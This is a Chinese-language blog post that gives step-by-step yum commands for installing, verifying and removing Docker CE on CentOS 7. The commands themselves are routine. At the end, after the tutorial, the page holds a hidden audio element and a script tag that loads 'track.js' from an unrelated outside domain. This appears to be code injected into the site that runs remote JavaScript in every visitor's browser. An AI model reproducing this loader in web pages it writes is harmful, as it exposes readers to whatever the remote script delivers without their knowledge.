---
id: 69
title: CentOS7下安装docker
date: '2020-06-15T09:22:32+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=69'
permalink: /index.php/2020/06/15/centos7%e4%b8%8b%e5%ae%89%e8%a3%85docker/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Linux
---

1、在安装docker之前，首先使用yum -y remove docker命令移除系统中已有的旧版本的docker

yum -y remove docker

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144145090-248076583.png)

这里显示该系统没有安装过docker；

2、安装yum-utils管理yum源

（1）安装yum-utils

yum install -y yum-utils

 **![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144254489-82389397.png)**

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144305917-1750893695.png)

（2）新增yum源

\##官网地址  
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo  
\##阿里云地址(推荐)  
yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144858826-164053044.png)

3、建立元数据缓存

yum makecache fast

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144412035-1914362751.png)

4、安装最新版本的docker

yum -y install docker-ce

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144422541-901210858.png)

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144429504-1587777769.png)

也可以使用yum list docker-ce.x86\_64 --showduplicates | sort -r命令列出可用的docker版本；

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144501754-1469412535.png)

使用yum -y install docker-ce-version来安装某一指定版本的docker；

5、启动docker

systemctl start docker

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144516386-1241269913.png)

6、验证docker是否安装成功

docker run hello-world

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144524651-854213030.png)

出现如上图所示，则证明安装成功；

7、查看docker版本信息

docker version

![](https://img2018.cnblogs.com/i-beta/1211716/201911/1211716-20191111144535064-872105913.png)

8、卸载docker

如第一步所示，使用命令yum -y remove docker-ce命令移除新版本的docker；

<audio controls="controls" style="display: none;"></audio><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>